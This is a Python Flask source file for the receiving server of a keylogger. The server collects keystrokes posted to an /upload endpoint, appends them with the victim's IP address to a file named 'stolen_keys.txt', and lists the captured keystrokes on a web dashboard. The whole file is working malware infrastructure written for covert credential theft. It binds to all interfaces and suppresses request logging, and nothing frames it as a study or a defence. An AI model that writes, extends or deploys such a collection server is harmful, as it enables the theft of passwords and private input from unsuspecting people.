import logging
from flask import Flask, request, render_template
import datetime
import os


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
LOG_FILE = "stolen_keys.txt"

print("--------------------------------------------------")
print("   MONITORING STATION ONLINE")
print("   Waiting for incoming keystrokes...")
print("--------------------------------------------------")

@app.route('/upload', methods=['POST'])
def receive_keys():
    data = request.form.get('keys') 
    ip_address = request.remote_addr
    
    if data:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        
       
        print(f"\n[+] INTERCEPTED ({timestamp}): {data}")
        
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp}|{ip_address}|{data}\n")
        return "Received", 200
    return "Error", 400

@app.route('/')
def home():
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            for line in reversed(lines):
                try:
                    parts = line.strip().split('|')
                    if len(parts) >= 3:
                        logs.append({
                            "time": parts[0],
                            "ip": parts[1],
                            "keys": parts[2]
                        })
                except:
                    continue
    return render_template('index.html', logs=logs)

if __name__ == '__main__':
   
    app.run(host='0.0.0.0', port=5000, debug=False)
